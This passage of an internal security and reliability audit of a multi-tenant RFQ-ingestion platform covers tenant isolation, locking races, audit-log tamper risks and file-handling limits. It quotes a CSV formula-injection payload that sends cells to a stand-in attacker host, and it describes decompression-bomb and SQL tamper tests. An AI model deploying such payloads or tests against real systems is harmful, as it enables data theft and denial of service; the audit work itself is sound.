And `EnqueueAsync`'s dedup lookup (`ExtractionQueue.cs:161-167`) keys on `SourceDocumentOccurrenceId`
when supplied, **not** on content hash. The only thing preventing two jobs for identical bytes is the
app-level `source.ExtractionJobId` check at `DocumentIngestionService.cs:351`. Production is clean
today (57 jobs / 57 distinct hashes) — but that is application discipline, not a constraint.

**Fix.** Add the unique index, or correct the comment. Do not leave a false guarantee in a header.

---

### R-REL-06 (S2) — the reconciliation advisory lock key differs by branch, so two concurrent ingests can both create a Lead

`LeadIdentityApplicationService.cs:61`:

```csharp
pg_advisory_xact_lock(hashtextextended(BU + ":" + (scope is not null && normalizedRfq is not null
    ? scope + ":" + normalizedRfq
    : intake.ExternalSourceId ?? intake.ContentHash ?? fingerprint), 0))
```

Two concurrent ingests of the same logical inquiry — one where scope+RFQ resolved, one where it did
not — take **different** advisory locks, run concurrently, both miss each other's uncommitted
occurrence, and both fall through to `:184-197` creating two Leads. Nothing at the DB level prevents
this: `UX_Leads_BU_CommercialCaseReference` is on a server-generated reference (unique by
construction) and `UX_Leads_CommercialCaseID` on the case FK. **Semantic dedup has no DB backstop.**

**Fix.** Make the key branch-invariant — always take `BU:contentHash` **and** `BU:scope:rfq` when both
are derivable.

---

### R-REL-07 (S2) — `PostgresAdvisoryLease` is unfenced and its only consumer never re-checks

`Services/PostgresAdvisoryLease.cs` issues **no token, has no renew method, and persists nothing**.
State is `long _key` (`:31`) and `bool _released` (`:32`); release (`:83`) is best-effort and swallowed
(`:85-89`). It is *connection-liveness*-scoped, which correctly immunises it against clock skew and GC
pauses — but the sole consumer, `Services/EmailBackgroundService.cs:57`, checks `lease is null`
**once** at `:70`, then runs `RunPollCycleAsync` (`:108-155`) to completion with zero re-validation.

**Failure scenario.** A TCP reset from a proxy, PgBouncer or a Neon failover releases the session lock
server-side. A standby acquires it. **The original poller keeps writing leads.** Under PgBouncer
transaction pooling it breaks entirely.

**Fix.** The codebase already contains two correct fencing implementations to copy:
`QuoteDelivery/QuoteDeliveryStore.cs:56-57, 89-92` (token re-checked in the mutation `WHERE`) and the
extraction queue's `Attempts` generation. Issue a token on acquire and re-check before each tenant's
write batch.

---

### R-REL-08 (S2) — 26 unwrapped `BeginTransactionAsync` sites produce permanently unrecoverable dead-letters

`Program.cs:106` and `:622` enable `EnableRetryOnFailure(5, 10s)`, which forbids user-initiated
transactions outside `CreateExecutionStrategy`. The extraction path is correctly wrapped
(`ExtractionWorker.cs:1073`, `DocumentIngestionService.cs:119`,
`LeadIdentityApplicationService.cs:38-42`, `ExtractionDeadLetterService.cs:427`) — but **26 unwrapped
call sites remain**, e.g. `Services/LeadUploaderService.cs:73`, `Services/ManualUploadService.cs:311`,
`Services/EmailService.cs:588`, `Repositories/RfqRepository.cs:313`,
`Repositories/CustomerRepository.cs:277`, `Repositories/ContactRepository.cs:352`.

**Production evidence:** 7 dead-lettered jobs carry
`"…NpgsqlRetryingExecutionStrategy does not support user-initiated transactio…"`. This is
**deterministic** — retries can never clear it. The documents are permanently dead until code changes.

**Fix.** Audit all 26 sites; wrap or remove.

---

### R-REL-09 (S2) — `QuoteNo` and `ShipmentNo` are SELECT-MAX+1 with no unique backstop

```
 Orders    | UX_Orders_BU_OrderNo | UNIQUE (BusinessUnitID, OrderNo) WHERE OrderNo <> ''
 Quotes    | IX_Quotes_QuoteNo    | non-unique
 Shipments | — no index on ShipmentNo at all —
 RFQ       | — no unique on Rfqno —
```

- `Services/QuoteService.cs:292-316` — `ORDER BY QuoteNo DESC LIMIT 1`, parse, `+1`. Caller `:129` runs
  with **no transaction at all**. Duplicated verbatim in `Services/QuotationUploaderService.cs:295-316`,
  whose caller `:267` sits in a **Read Committed** transaction — which does not prevent two uploads
  reading the same last row. **No unique index → both commit.**
- `Repositories/ShipmentRepository.cs:74-97` — same pattern, no transaction, **no index of any kind**.
- `Repositories/OrderRepository.cs:90-113` — same pattern, but `UX_Orders_BU_OrderNo` turns the race
  into a visible unique violation rather than corruption. Also uses local `DateTime.Now` at `:92`.
- `DocumentIntelligence/Persistence/StructuredEvidenceLedgerPersister.cs:260-268` — literal
  `MaxAsync + 1` behind `pg_advisory_xact_lock(corpusId)`. This is the **only** advisory call in the
  codebase passing a raw entity id instead of a `hashtextextended(…)` digest, so it shares the
  single-argument `bigint` namespace unpartitioned; and it has no `CurrentTransaction is null`
  assertion (contrast `CommercialRouting/CustomerIdentityMaintenance.cs:33-34`, which throws), so
  outside a transaction it is a silent no-op.

**Explicitly correct — no action.** RFQ/lead numbering itself is sound: `nexora_assign_commercial_case`
uses `nextval('"CommercialCaseReferenceSequence"')`, backed by `UX_CommercialCases_AllocationNumber`,
`UX_CommercialCases_BU_MasterReference`, `UX_Leads_BU_CommercialCaseReference`. Production is clean and
gap-free — `last_value = 51` against exactly 51 Leads. **Two concurrent ingests cannot produce the same
lead serial or skip one.** `Repositories/RfqRepository.cs:362-366` also uses `nextval`.

**Fix.** Move `QuoteNo` / `ShipmentNo` to sequences; add unique indexes on `Quotes`, `Shipments`, `RFQ`
and `(CorpusId, InquiryNumber)`; hash the `corpusId` lock key and assert an ambient transaction.

---

## A3 — Severity S3

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| **R-SEC-06** | `Attachment` has **no tenant column and no EF query filter**. Sole defence is a parent-derived RLS policy that is `ENABLE`-only and requires `ParentType='Lead'`; an attachment with any other `ParentType` is invisible to every tenant and unpredicated for any BYPASSRLS role. On the SQLite test lane there is **no isolation at all**. | `Models/ErpRfqAutomationContext.cs:156-171`; no `HasQueryFilter`; policy `qual` verified in `pg_policies`; 108 rows, 54 orphaned | Add a query filter mirroring the RLS `qual` exactly, or denormalise `BusinessUnitId`. Add `FORCE`. |
| **R-SEC-07** | `AgentAuditLogs` is **not append-only at any layer**, despite `Agent/Models/AgentEntities.cs:96-98` stating *"Never updated or deleted."* No trigger; `nexora_tenant_app` holds `DELETE, INSERT, SELECT, UPDATE`; the runtime executes as that role for every authenticated tenant request (`TenantRlsCommandInterceptor.cs:281,290`). Six sibling audit tables **do** have append-only triggers. `IamAuditEvents` has no trigger either but is saved by grants. | `information_schema.triggers` — `AgentAuditLogs` absent; `has_table_privilege` confirms UPDATE/DELETE | Add `trg_agent_audit_logs_append_only` (BEFORE UPDATE OR DELETE, ERRCODE 55000) and `REVOKE UPDATE, DELETE … FROM nexora_tenant_app, nexora_pipeline_app`. Defence in depth: triggers **and** grants. |
| **R-SEC-08** | **No audit table is tamper-evident.** Searched every audit table for `%hash%`, `%sign%`, `%seq%`, `%chain%`, `%prev%`, `%hmac%`: two hits, both false positives (`OrderToCashAuditEvents.PreviousState` is a business status; `.RequestHash` is idempotency, `OrderToCash/CustomerAwardApplicationService.cs:927`). Append-only stops the *application* rewriting history; it does not detect a rewrite by anyone reaching the DB directly — and `neondb_owner` (BYPASSRLS, `TRUNCATE` on every audit table) is in the web service's environment (R-SEC-10). | `LeadIdentityAuditEvents` columns: `Id, BusinessUnitId, LeadId, OccurrenceId, EventType, PayloadJson, ActorType, ActorId, CorrelationId, IdempotencyKey, OccurredAtUtc` | Add `PreviousHash`/`RowHash` over `(previous RowHash ‖ canonical row payload)`, written in the insert transaction, with a periodic verifier. Cheap at 47 rows; very hard at 47 million. |
| **R-SEC-09** | **105 controller actions bypass the global exception handler** with `catch (Exception ex) { return StatusCode(500, $"Error: {ex.Message}"); }` across 21 files. An `NpgsqlException` leaks the Neon hostname; a `PostgresException` leaks schema names and SQLSTATE. Frontend `apiErrors.ts` is a well-built gate (`:119-131` blocks `\b\w*Exception\b`, `System.`/`Npgsql.`, stack frames, `host:port`, paths, SQL; `:350` refuses all server text for ≥500) — but **~25 call sites never adopted it** and render `.detail`/`.message` raw. No XSS (React escapes; zero `dangerouslySetInnerHTML` in the codebase) — information disclosure only. | `Controllers/OrderController.cs:89-92`, `CurrencyController.cs:101`; `Frontend/src/pages/Suppliers/SuppliersPage.tsx:189,371` | Delete the catch-all returns; let `Program.cs:703-708` run. Route the ~25 frontend sites through `describeApiError`. |
| **R-SEC-10** | **The web process holds a BYPASSRLS owner credential.** `ConnectionStrings__MigrationConnection` is present in the running service's environment with `Username=neondb_owner` (`rolbypassrls = t`, owner of all 207 tables), and `Database__ApplyMigrationsOnStartup = true`. Any env dump, SSRF-to-metadata or RCE in the web process yields a credential that defeats the entire `nexora_tenant_app` design in one step. | Render env-var API; `pg_roles`; `pg_tables` owner column | Run migrations from a separate one-shot job / pre-deploy command so the long-lived web process never holds owner credentials. |
| **R-SEC-11** | **CSV formula injection in the BoQ export.** `Boq/BoqBuilderService.cs:874-879` does RFC-4180 quoting only; leading `=`, `+`, `-`, `@`, TAB and CR are not neutralised. Applied to `item.Description`, `item.ItemCode`, `section.Title`, `item.Source`, `item.EvidenceNote` (`:735-747`) — all AI-extracted from customer documents. Served at `Controllers/BoqController.cs:149` as `text/csv` **with a UTF-8 BOM**, which makes Excel the default handler. *Scenario:* a customer RFQ line reads `=HYPERLINK("https://attacker/"&A1&A2,"Click for spec")`; an estimator exports and clicks; the tenant's pricing cells leave in the URL. DDE variants reach code execution on older Excel. **Not vulnerable:** the XLSX exports use EPPlus typed string cells; the frontend constructs no cells at all. | `BoqBuilderService.cs:874-879` | Prefix any cell starting with `= + - @ \t \r` with `'`. Unit test with `=1+1` as a description. |
| **R-SEC-12** | **Verified read buffers the entire object in memory.** `IEvidenceObjectStorage.cs:212-220` copies the whole object into a `MemoryStream` to hash before serving, and `FileController.cs:130` then serves with `enableRangeProcessing: true` — so a 1-byte range request materialises 25 MB. ~20 concurrent downloads exhaust the 512 MB instance. | `IEvidenceObjectStorage.cs:212-220`; `FileController.cs:130` | Stream through a `CryptoStream` and fail mid-flight on mismatch, or verify on write + on a schedule rather than per read. |
| **R-ID-05** | **The new revision records the *old* customer RFQ reference.** `LeadIdentityApplicationService.cs:706` sets `NormalizedCustomerRfqReference = Normalize(canonical.Rfqno)` **before** `ApplySnapshotProjection` (`:715`) updates `canonical.Rfqno`, so the latest revision indexes the superseded reference and the unbounded `strongLeadId` lookup (`:127`) lags one amendment behind. | `:703-708`, `:715` | Take the reference from the incoming amendment, not the pre-projection canonical. |
| **R-REL-10** | **Catch blocks that discard a document with no durable record.** `Ingestion/Triage/EmailIngestEnqueuer.cs:149-154` (attachment) and `:183-186` (body) → `LogError` only, loop continues: **no row, no retry**. `Services/ManualUploadService.cs:437-442` → `skipped++`, summary does not name the files. `Controllers/ExtractionController.cs:155-161` → visible once in the HTTP body, no durable row. `ExtractionWorker.cs:1153-1157, 1190-1198, 1217-1224` → lead survives **unenriched** with no record that enrichment failed. `ExtractionWorker.cs:686-690` (`DefaultExtractionDocumentReader`) → `text = string.Empty` and extraction proceeds on empty content (production uses `ProductionDocumentReader`, so conditional). | as listed | Give the email and manual doors the durable record the folder door already has (`FolderService.cs:298-317`): write a `SourceDocumentOccurrence` in `Rejected`/`Retryable` **before** rethrowing. |

---

## A4 — Severity S4

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| **R-SEC-13** | `.xlsm` is on the intake allow-list but **can never be accepted**. `InspectOpenXml` can only ever return `[".xlsx"]` for a workbook, so a **macro-free** `.xlsm` falls through to the extension-mismatch branch and is rejected with *"The content signature does not match the '.xlsm' extension."* That sentence is false — and post-fix-(b) it is now rendered verbatim to the user as authoritative product copy. Exactly the intake/inspection drift the allow-list's own doc comment exists to prevent. | `DocumentIntakeAllowList.cs:32`; `DocumentFileInspectionService.cs:384`, `:116-122` | Remove `.xlsm`, or return `[".xlsx", ".xlsm"]` for a macro-free workbook. |
| **R-SEC-14** | `GET /api/UnAssignedLead/users-for-assignment` has **no permission gate** — only class-level `[Authorize]`, while every sibling action carries `[RequireModulePermission]`. Correctly tenant-scoped; intra-tenant it hands the user directory to any authenticated user. | `Controllers/UnAssignedLeadController.cs:101-113` | Add `[RequireModulePermission("Leads", View)]`. |
| **R-SEC-15** | `AiProcessingPolicies` carries a `{public}` INSERT policy `nexora_ai_default_provisioning` that pins every value column to the safe default but **omits `BusinessUnitId`**. PERMISSIVE policies are OR'd, so a role in `public` satisfying the check could write a default policy row for **any** tenant. **Not exploitable today** — `has_table_privilege('nexora_tenant_app', …, 'INSERT') = f`; the only role with INSERT is `nexora_pipeline_app`, which is BYPASSRLS and ignores policies anyway. A missing grant is the only thing standing in the way. | `pg_policies` | Add `AND "BusinessUnitId" = (NULLIF(current_setting('nexora.business_unit_id', true),''))::bigint` to the `with_check`. |
| **R-SEC-16** | Client-supplied `businessUnitId` fallback survives in ~30 controllers: `var targetBUId = claimBUId > 0 ? claimBUId : (businessUnitId ?? 0);`. The claim always wins, and the fallback is unreachable **only because** three things hold simultaneously: `FallbackPolicy` (`Program.cs:339-343`), `MapControllers().RequireAuthorization()` (`:745`), and `TenantClaimGuardMiddleware` (`:737`). Remove or reorder any one and every route becomes a client-controlled tenant selector. The parameters are also still in the OpenAPI surface. | `Controllers/LeadController.cs:51-52, 88-89`; `UnAssignedLeadController.cs:40-41, 76-77, 105-106` | Delete the parameters. `ManualUploadController.cs:218-220` and `LeadUploaderController.cs:38,60` already show the safe pattern. |
| **R-SEC-17** | `SELECT count(*) FROM platform."Tenants"` succeeds for `nexora_tenant_app` (returns 2) while selecting any identifying column is denied. Cause is deliberate column-level grants (`Id`, `Status`, `PlanId`, `PrimaryBusinessUnitId` only); `platform.*` has no RLS on 8 of 9 tables, so the column grants **are** the isolation there and they are correctly minimal. Leaks the platform tenant count only. | `pg_attribute.attacl`; role-switched reads | Accept, or revoke `count`-enabling grants if the count is considered sensitive. |

---

# B. TECHNICAL DEBT

Not defects — design gaps and unfinished wiring that will become defects at pilot scale.

| ID | Item | Evidence | Severity |
|---|---|---|---|
| **R-DEBT-01** | **Four identity signals FR-RFQ-06 requires are never populated.** `EmailThreadId` and `MimeType` and `FileSize` are passed as literal `null` by the only caller (`ExtractionWorker.cs:927-928`) — 0/47 each. `LogicalGroupKey` is 0/47, so the grouped-revision branch (`LeadIdentityApplicationService.cs:141-159`) is dead code on every channel that has ever run. `Leads.CustomerID` is NULL on 47/47, so `CustomerScope` (`:866`) never reaches its strong `customer:{id}` form. | production column counts | S2 |
| **R-DEBT-02** | **`ReconcileAsync` has exactly one caller** — `ExtractionWorker.cs:921`. Any channel that does not terminate in an extraction job never reaches identity at all. Only two `SourceChannel` values have ever produced an identity decision: `Legacy` 23 (backfill) and `ManualUpload` 24. **Email ingestion has never produced one.** | `SELECT "SourceChannel", count(*) FROM "LeadIngestionOccurrences" GROUP BY 1;` | S2 |
| **R-DEBT-03** | **155 occurrences and 54 documents are stranded in a pre-fix terminal state.** They carry `last_error_code='document_quarantined'` with `IsRetryable=false`, which routed them to `Rejected` via `DocumentIngestionService.cs:336-343`. The **current** code no longer does this — `DocumentFileInspectionService.cs:184-196` now returns `IsRetryable=true, ErrorCode="security_scanner_unavailable"`. The classification bug is fixed; the stranded rows were never migrated, and production has **zero** rows in `AwaitingSecurityScan`. They are recoverable (`SecurityHoldRecovery.cs:18-22` lists `document_quarantined` as recoverable; `SecurityScanRecoveryService.RetryTenantAsync:91-94` replays from immutable bytes) — nobody has run it. | production `last_error_code` distribution | S2 |
| **R-DEBT-04** | `Confidence` on `LeadIngestionOccurrences` is a **policy constant**, not a confidence: hard-coded `1m` for `New`/`ExactDuplicate` and `.98m` for `Revision` (`LeadIdentityApplicationService.cs:113, 187, 221`). Only the possible-match arm carries a computed score. Charter §5 already flags `AIConfidence` as fabricated; the same caution applies here. | `:113, :187, :221` | S3 |
| **R-DEBT-05** | Email HTML is flattened with `Regex.Replace(html, "<.*?>", " ")` (`Services/EmailService.cs:1151`, `Ingestion/Triage/EmailTriageService.cs:301`). Naive, but **not an XSS risk** — output is text-rendered and React escapes it, and there is no `dangerouslySetInnerHTML` anywhere in the frontend. Risk is extraction quality (nested/malformed markup), not security. | `:1151`, `:301` | S3 |
| **R-DEBT-06** | `IX_LeadIngestionOccurrences_BusinessUnitId_IdempotencyKey` correctly prevents cross-tenant replay, but **nothing at the DB level prevents two canonical `Leads` for the same logical RFQ** (see R-REL-06). Semantic dedup has no backstop. | `pg_indexes` | S3 |
| **R-DEBT-07** | 2 `AiRequests` rows are stuck in `Reserved` — leaked reservations that were never settled. `ProviderClass = External` for **all 1,916** requests, because `Ollama__BaseUrl` is the hosted `https://ollama.com/`; there is **no local model on this deployment**. 1,879 successful External calls produced 51 leads (~37 calls/lead) — directly relevant to charter amendment A5 (cost per document). | `AiRequests` | S4 |

---

# C. EXTERNAL DEPENDENCIES

| ID | Dependency | Failure visible? | Recoverable? | Can silently drop? | Severity |
|---|---|---|---|---|---|
| **R-EXT-01** | **Malware scanner.** ClamAV was unreachable 2026-07-28/29 (`{"reason":"ClamAV is unavailable (SocketException); the file must remain quarantined."}`), stranding **54 of 86 documents (63%)** before the queue. Config has since moved to `BuiltIn`. `MalwareScannerProvisioning.cs:130-149` fails **closed** to ClamAV at a loopback endpoint flagged `EndpointLooksUnconfigured` when the setting is absent on a non-Development host. | ⚠️ Durable rows exist but are labelled terminal `Rejected` | ✅ `SecurityScanRecoveryService.RetryTenantAsync` is idempotent and replays from immutable bytes | ⚠️ 155 occurrences invisible-as-recoverable | **S1** |
| **R-EXT-02** | **Object storage** — `EvidenceStorage__Provider=Local`, `IsDurable=false`, root `/var/data/nexora/uploads`. 15 dead-lettered jobs point at `/app/Uploads/…` from a previous deployment; those bytes are gone. `/ready` is permanently `Unhealthy` because of this. | ⚠️ **Partly** — `SourceObjectUnavailable` is filtered out of both the DL list and readiness (R-REL-02) | ❌ 15 jobs / 48 occurrences permanently lost | ✅ **Yes — 15 jobs today** | **S1** |
| **R-EXT-03** | **AI provider** — Ollama at `https://ollama.com/`, model `deepseek-v4-pro`. | ✅ `ChunkedExtractionService.cs:334` → `FailAsync` → `LastError` + dead-letter. 11 jobs currently `"LLM returned no result for the document."` | ✅ `ExtractionWorker.cs:261-273` retries; operator re-drive works (85 `RetryQueued` events) | ❌ No | S2 |
| **R-EXT-04** | **Database** — Neon PostgreSQL 17.10. 4 jobs `"An error occurred while saving the entity changes"`; 7 jobs blocked by the execution-strategy bug (R-REL-08 — a Nexora defect, not a Neon one). | ✅ Yes | ⚠️ The 7 are permanently dead until code changes | ❌ No | S2 |
| **R-EXT-05** | **Notifications** — `Notifications__Provider=console`. No notification reaches a human on this deployment. | n/a | n/a | n/a | S3 |

---

# D. ACCEPTED PILOT LIMITATIONS

Conscious, declared trade-offs. Each needs an owner and a date before GO.

| ID | Limitation | Declared where | Condition for pilot |
|---|---|---|---|
| **R-LIM-01** | **No anti-virus.** `BuiltIn` = structural inspection only. Mode = **Pilot Deferred**, explicit in declaration (`render.yaml:1-13, 74-84`, cost +$85/mo, runbook `docs/RUNBOOK-CLAMAV-RENDER.md`), accidental in operation. | `render.yaml` | **The render.yaml precondition is already violated** — it says *"Restore ClamAV before any production tenant uploads documents"* and 30 tenant documents are ingested. Either deploy ClamAV, or fix R-SEC-01 + R-SEC-02 so the posture is truthful everywhere. Not both optional. |
| **R-LIM-02** | **Non-durable evidence storage.** Local disk, `IsDurable=false`, `/ready` permanently red. | `render.yaml:19-24` | Owned + dated, or move to S3. Until then R-EXT-02 recurs on every storage-root change. |
| **R-LIM-03** | **Arabic / Hijri extraction out of scope.** | Charter A1, founder-approved 2026-08-06 | Record as a limitation in the client-facing pack, not silently dropped. |
| **R-LIM-04** | **No local AI model.** Every request is `ProviderClass=External`; the local-first posture is not achievable on this deployment. | R-DEBT-07 | Feeds charter A5 cost-per-document. |
| **R-LIM-05** | **Entitlement quotas are inert for the pilot tenant.** `platform."Tenants"` holds 2 rows, for `PrimaryBusinessUnitId` 5 and 6. All production ingestion data belongs to **BU 1**, which has no `Tenants` row, so `TenantAccessService.GetAccessAsync` (`:62-63`) returns the documented "legacy BU → fail open" snapshot. `TenantStatusGuardMiddleware` cannot suspend BU 1, and seat/document quotas return `Unlimited` — making the `EntitlementDeniedException` handling at `ExtractionController.cs:137-156` and `ManualUploadController.cs:93-97` **dead code in production**. Intended behaviour, but upload quota enforcement on the live pilot tenant does not exist. | `Platform/Entitlements/TenantAccessService.cs:62-63` | Provision a `Tenants` row for the pilot BU, or accept and document. |

---

# E. BLOCKED — cannot be settled read-only

Each carries the **exact** test that would settle it.

| ID | Claim | Exact settling test |
|---|---|---|
| **E-01** | R-REL-01 end-to-end starvation. The trigger arithmetic, the missing savepoint and the `Attempts` rollback are verified from the function body and `ExtractionQueue.cs:282-304`; only the wall-clock starvation is unmeasured. | On staging: insert a `SourceDocumentOccurrence` with `intake_status='Accepted'`, bind a claimable `ExtractionJob` to it, start the worker. Expect throughput 0 and a repeating `23514` log line with `Attempts` unchanged. |
| **E-02** | R-SEC-03 OOM. Allocation arithmetic is derived from `DocumentFileInspectionService.cs:316-342` and the 512 MB `starter` plan; not executed. | Build a 25 MB OOXML whose `[Content_Types].xml` expands to ~200 MB at ratio < 300×. `POST /api/Extraction/upload` on a 512 MB staging instance; watch RSS and the exit code. Expect an OOM kill **before** any rejection response. |
| **E-03** | Audit append-only triggers actually fire. Bodies read from `pg_proc`; not exercised. | `BEGIN; SET LOCAL ROLE nexora_tenant_app; UPDATE "LeadIdentityAuditEvents" SET "EventType"='tampered' WHERE "Id"=(SELECT MIN("Id") FROM "LeadIdentityAuditEvents"); ROLLBACK;` → expect `55000`. Run the same against `"AgentAuditLogs"` → expect **success**, which is R-SEC-07. |
| **E-04** | R-SEC-15 exploitability. Grants say no; policy says yes. | `BEGIN; SET LOCAL ROLE nexora_tenant_app; SELECT set_config('nexora.business_unit_id','1',true); INSERT INTO "AiProcessingPolicies"("BusinessUnitId","IsEnabled","ExternalProcessingAllowed","AllowedPurposes","Version","UpdatedBy") VALUES (99,true,false,'RfqExtraction,BoqDraft',1,'tenant-provisioning'); ROLLBACK;` → expect `42501`. |
| **E-05** | Cross-tenant isolation under real multi-tenant load. **Production has only one business unit with data** (BU 1: 47→51 Leads, 86 source_documents, 57 ExtractionJobs, 28 field_evidence), so no cross-tenant exploit is *demonstrable* against live data. Isolation was proven by role-switched reads with a synthetic GUC (§B1), not by exfiltration. | Seed a second BU with data on staging; run the full journey as a BU-A user and attempt to read every BU-B id enumerated from the DB. |
| **E-06** | Whether R-ID-02 fires on real client documents at the observed reference-drift rate. | Re-drive the founder's golden corpus with a deliberate amendment pair (same buyer, reference changed) and assert the second document classifies as `Revision` or `PossibleMatch`, never `New`. |

---

# F. VERIFIED SOUND — do not disturb, and do not re-audit

Recorded so later phases do not spend budget re-deriving it, and so a refactor does not silently
remove a control.

**Tenant isolation (empirically verified, read-only, in rolled-back transactions).**
The runtime connects as `nexora_runtime` — **not** the table owner, `rolbypassrls = f` (confirmed in
`pg_stat_activity`: 7 connections via pgbouncer). The "table owner bypasses non-FORCE RLS" hazard the
code itself warns about does **not** apply to the live runtime path. RLS is **fail-closed**:

```
SET LOCAL ROLE nexora_tenant_app, GUC = 1   →  att 54 | li 3133 | fe 28 | dp 2 | ej 57 | lio 47
SET LOCAL ROLE nexora_tenant_app, GUC = 999 →  att  0 | li    0 | fe  0 | dp 0 | ej  0 | lio  0
SET LOCAL ROLE nexora_tenant_app, no GUC    →  leads_visible = 0
```

202 of 207 tables have RLS enabled. **Every ingestion table has RLS and exactly one policy.** The five
without RLS — `FinanceProviderSecrets`, `Images`, `LoginAttempts`, `Module`, `__EFMigrationsHistory` —
contain no ingestion data, and `Images` is not granted to `nexora_tenant_app` at all.

**IDOR/BOLA: no route in the 10 audited controllers trusts a client-supplied id without either a
tenant predicate or an active global query filter.** `Program.cs:339-343` sets an authenticated
`FallbackPolicy`; `:745` is `MapControllers().RequireAuthorization()`;
`MultiTenancy/TenantClaimGuardMiddleware.cs:27-35` 403s any authenticated request outside
`/api/platform` lacking a `businessUnitId > 0` claim. The **only** `[AllowAnonymous]` endpoints in the
entire backend are the two login routes; `/health` and `/ready` return status only. All 82
`IgnoreQueryFilters()` sites were classified individually — every tenant-plane one carries an explicit
`BusinessUnitId ==` predicate and is additionally bound by RLS.

**Evidence storage.** Keys are content-addressed and unguessable —
`Evidence/tenants/{bu}/{zone}/sha256/{xx}/{sha256}.{ext}` (`IEvidenceObjectStorage.cs:176-180`). Zero
`UseStaticFiles` / `UseFileServer` / `UseDirectoryBrowser` in the whole solution; `wwwroot/` and
`Uploads/` are on disk but not web-served; the path-addressed download endpoint returns **410 Gone**
(`FileController.cs:53-58`). **The hash is verified on read** — `FileController.cs:125` →
`OpenVerifiedReadAsync` → `CryptographicOperations.FixedTimeEquals`, mismatch → `409` (`:141-145`).
Object keys are stored in `source_metadata` but every consumer reduces them to booleans; they never
reach a DTO, and the frontend has zero references to any storage key.

**File handling.** Magic-byte sniffing, never the declared Content-Type
(`DocumentFileInspectionService.cs:200-265`); extension↔content match enforced (`:116-122`); double
extensions safe; 25 MB per file / 200 MB per request / 50 files; archive entry count 1,000;
**mid-stream** expansion cap 256 MB (`:307-312, 325-329`), not header-trusted; 300× ratio per entry
and on totals; zip-slip rejected (rooted paths, `.`/`..`, `:`, duplicate names — `:579-591, 293-295`);
nested archives never expanded (`:387`); macros detected in **both** OOXML (`xl/vbaProject.bin`) and
OLE (flat scan for `_VBA_PROJECT_CUR`, nested storages included) with a **terminal**, non-retryable
refusal (`:356-363, 370-383, 400-413`).

**Charter §5 fixes confirmed still holding.** (a) The 121 MB Aramco RFP: caps now 256 MB / 300×
(`:27-35`) and the `.docx` reader is streaming (`ProductionDocumentReader.cs:255` uses
`OpenXmlReader.Create`, not DOM). (b) Truthful rejection reasons reach the user end-to-end
(`DocumentInspectionContracts.cs:49` → `Frontend/src/utils/intakeErrors.ts:142`), with operator detail
segregated into `OperatorDiagnostics` (`:85`); production `last_error_details` samples carry no
document content and no credentials. (c) The intake allow-list is unified —
`DocumentIntakeAllowList.cs:30` is the single source, consumed by inspection, email and manual upload
(one dead entry, R-SEC-13).

**Worker fencing — the best-engineered part of the pipeline.** `Attempts` is a monotonic generation
incremented at claim (`ExtractionQueue.cs:132`) and re-checked in the `WHERE` of **every** subsequent
write — `RenewLeaseAsync:312`, `SetStatusAsync:328`, `CompleteAsync:344`, `FailAsync:365`,
`FailPermanentlyAsync:384`. `ExtractionWorker.cs:1108-1116` re-validates inside the persistence
transaction; `:1128-1129` throws on a fenced completion. **A duplicate worker delivery cannot
double-process.**

**Manual re-drive is safe.** `ExtractionDeadLetterService.cs:100-102, 196-198` short-circuit on the
idempotency key, backed by `UX_extraction_dead_letter_events_tenant_job_idempotency`, with the whole
mutation under `pg_advisory_xact_lock` (`:433-435`). 85 `RetryQueued` events produced zero duplicate
leads.

**Lead/RFQ numbering is correct** — a true DB sequence inside `nexora_assign_commercial_case`, backed
by three unique indexes; `last_value = 51` against exactly 51 Leads, gap-free. Two concurrent ingests
cannot collide or skip.

**DB-enforced uniqueness that does exist and works:**
`ux_source_document_occurrences_tenant_idempotency`, `ux_source_documents_tenant_hash`,
`UX_ExtractionJobs_BU_SourceOccurrence`, `IX_LeadIngestionOccurrences_BusinessUnitId_IdempotencyKey`,
`ux_extraction_runs_tenant_job_attempt`.

**Append-only audit triggers on six tables** (verified in `information_schema.triggers` with bodies
raising `55000`): `LeadIdentityAuditEvents`, `CommercialFinanceAudits`, `LeadReviewAudits`,
`OrderToCashAuditEvents`, `tenant_governance_audit_events`, `LeadOccurrenceDocuments`, plus three on
`source_documents` (no-delete, identity-frozen, purge-forward-only). **No code path mutates any audit
entity.**

**No secrets and no AI request/response bodies in logs.** Zero API keys, bearer tokens, passwords or
connection-string values across `AI/`, `Extraction/`, `Ingestion/`, `LeadIdentity/`, `Services/`,
`Notifications/`. `OllamaLlmService` logs lengths only at every classic dump site (`:163, :381, :498,
:539`). `Platform/Hardening/TenantLoggingMiddleware.cs:45-50` scopes only correlation id, tenant id and
path — no query string, headers or body. No `UseHttpLogging`, no `SetDbStatementForText`.

**Reconciliation does no external I/O inside a transaction.** AI extraction happens at
`ExtractionWorker.cs:225-259`, before persistence begins at `:291`; customer resolution and routing run
**after** commit (`:1078-1095`); `ReconcileAsync` correctly joins an ambient transaction
(`LeadIdentityApplicationService.cs:38-42, 55-59`) instead of nesting.

**Zero `dangerouslySetInnerHTML` in the frontend**, and none required.

---

# G. RECOMMENDED ORDER OF WORK

Ordered by (documents unblocked) × (client-visible harm), not by severity label alone.

| # | Action | Closes | Effort |
|---|---|---|---|
| 1 | Restore ClamAV (or make the reduced posture truthful in every surface); alert on `EndpointLooksUnconfigured`; run `SecurityScanRecoveryService.RetryTenantAsync` to release the 155 held occurrences | R-SEC-01, R-SEC-02, R-EXT-01, R-DEBT-03, R-LIM-01 | **unblocks 63 % of the corpus** |
| 2 | Add the occurrence-state predicate to the `candidate` CTE + a savepoint or `23514` handler so the pill exhausts | R-REL-01 | closes the incident class |
| 3 | Fix the identity fall-through at `LeadIdentityApplicationService.cs:165-166`; stop `ApplySnapshotProjection` overwriting the canonical record | R-ID-02, R-ID-03 | unblocks FR-RFQ-05/06 |
| 4 | Stop hiding `SourceObjectUnavailable`; make `StoragePath` root-relative | R-REL-02, R-EXT-02 | stops silent loss |
| 5 | `ALTER TABLE … FORCE ROW LEVEL SECURITY` on the 122; `Attachment` query filter; make `nexora_pipeline_app` `NOBYPASSRLS` | R-SEC-05, R-SEC-06 | one migration; highest structural leverage |
| 6 | Cap the `[Content_Types].xml` capture; wire `UploadPolicy` to the three upload endpoints | R-SEC-03 | removes a 1-request outage |
| 7 | Delete `FolderService.cs:735`; strip buyer PII from Information logs; add the scrubbing layer | R-SEC-04 | |
